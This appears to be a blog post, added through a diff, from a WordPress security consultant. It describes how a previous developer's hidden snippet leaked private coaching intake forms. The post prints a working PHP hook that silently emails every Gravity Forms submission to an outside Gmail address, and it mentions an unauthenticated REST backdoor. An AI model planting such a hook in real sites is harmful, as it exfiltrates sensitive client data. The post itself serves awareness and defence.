@@ -1,0 +1,98 @@
+---
+title: "Is Your Developer Stealing Your Data?"
+description: "A real client story about how a custom code snippet secretly forwarded private customer intake submissions to a developer's personal email, and how to protect your business."
+date: "2026-09-10"
+category: "WordPress Security"
+tags: ["WordPress Security", "Data Privacy", "Custom Code Snippets", "Security Audit", "Client Data Protection"]
+faq:
+  - question: "Can a standard WordPress security plugin detect custom code data leaks?"
+    answer: "No. Standard security plugins like Wordfence or Sucuri check for known malware signatures and outdated plugin versions. They cannot detect custom, syntactically valid PHP code written specifically to forward form submissions or open unauthenticated triggers."
+  - question: "How can I check if a past developer left unauthorized access on my WordPress site?"
+    answer: "A complete security audit requires reviewing custom functions in functions.php, mu-plugins, or Code Snippets plugins, alongside checking database admin users, active cron jobs, and server-level access logs."
+---
+
+Last week, a client came to me in a panic. She'd been referred to me by someone in her network, and the message she sent was blunt: 
+
+> *"I think my website has been hacked. A brand-new client of mine just received a strange, targeted email — right after filling out my private intake form."*
+
+She runs a coaching practice helping individuals navigate divorce and major life transitions. Her intake form is deeply personal — asking new clients about their finances, custody situations, and the sensitive circumstances driving them to seek professional support. Within hours of one client submitting his form, he received an unsolicited email from a total stranger, oddly tailored to the exact vulnerabilities he revealed.
+
+She assumed her email inbox was hacked or her client's device was compromised. She had no idea where to look or how to diagnose the leak.
+
+---
+
+## Beyond Standard Malware Scanners
+
+Most WordPress developers would have checked if her plugins were updated, run a basic malware scanner, and called it a day. But automated scanners only flag *known* security signatures — they cannot evaluate custom logic or think like the developer who wrote the code. 
+
+Because my background is in full-stack engineering — working across Linux servers, backend databases, and custom PHP runtime environments — I didn't just run automated tools. I audited her site line by line.
+
+That's when I found the leak.
+
+```php
+// Buried inside a custom "functions" snippet
+add_action('gform_after_submission', 'custom_submission_handler', 10, 2);
+function custom_submission_handler($entry, $form) {
+    $sensitive_data = print_r($entry, true);
+    // Hardcoded unauthorized recipient
+    wp_mail('unauthorized_stranger@gmail.com', 'Copy of Intake', $sensitive_data);
+}
+```
+
+Buried inside a custom code snippet — the kind of background script most WordPress site owners never inspect — was a single function quietly copying every client intake submission to a stranger's personal Gmail account. 
+
+It wasn't a glitch or an accidental debug line. It was hardcoded data exfiltration running silently in the background for months. No error message appeared, no alerts were triggered by hosting providers, and nothing appeared broken on the surface.
+
+---
+
+## Uncovered: Leftover Backdoors
+
+The investigation didn't stop there. Further line-by-line auditing revealed a second piece of leftover code from the same previous developer: an unauthenticated REST API endpoint that allowed external requests to trigger bulk email dispatching without requiring an admin password.
+
+Simply changing your WordPress admin password isn't enough if a developer previously had access to:
+1. `wp-config.php` and database credentials
+2. Server SSH / SFTP access keys
+3. Custom `mu-plugins` or function snippets
+4. Third-party API keys (SendGrid, Mailgun, Stripe)
+
+---
+
+## 4 Warning Signs Your WordPress Site May Be at Risk
+
+If your business has ever experienced any of the following, your database or form data could be exposed:
+
+1. **Inherited Codebases:** You inherited a site built by a previous freelancer or agency without a post-handoff code audit.
+2. **One-Off Freelancers:** You gave admin or FTP access to temporary developers who were never properly offboarded.
+3. **Pasted Code Snippets:** You installed a "Code Snippets" plugin and pasted custom PHP functions from online forums or past contractors.
+4. **False Sense of Security:** You assume that because the site loads quickly and shows zero visual errors, your client data is secure.
+
+---
+
+## How We Secured the Site
+
+We immediately performed an emergency intervention:
+* Purged all unauthorized custom function handlers and backdoors.
+* Rotated all database, SFTP, and API secret credentials.
+* Audit-logged all active admin user accounts and capability levels.
+* Configured strict Content Security Policies (CSP) and form destination validation.
+
+If you suspect your site or forms might be leaking sensitive information, don't wait for a client to report it. Get a manual code review to verify exactly what's executing on your server.
+
+---
+
+> [!IMPORTANT]
+> **This raises a critical question for every site owner:**  
+> When you part ways with a developer, do you actually revoke all access points?  
+>
+> *Do you have a process for revoking SSH keys, database credentials, and plugin tokens when offboarding developers? Let me know in the comments below!*
+
+---
+
+<div className="blog-card border blog-border rounded-xl p-8 sm:p-12 my-12 text-center bg-surface shadow-sm">
+  <h3 className="font-serif text-[28px] sm:text-[34px] font-bold blog-heading mb-4 leading-[1.2]">Is Your Client Data Really Secure?</h3>
+  <div className="text-[18px] sm:text-[20px] blog-text-muted max-w-[620px] mx-auto leading-[1.65] mb-8 font-normal">
+    Get a full manual security audit of your WordPress site — reviewing custom code snippets, form destinations, user privileges, and server access.
+  </div>
+  <a href="/security-audit" className="cta-btn inline-block bg-ink !text-white hover:bg-gold-dark text-[18px] font-semibold px-9 py-4 rounded-sm transition-colors duration-300 shadow-md">Book Your $29 Security Audit →</a>
+</div>
+
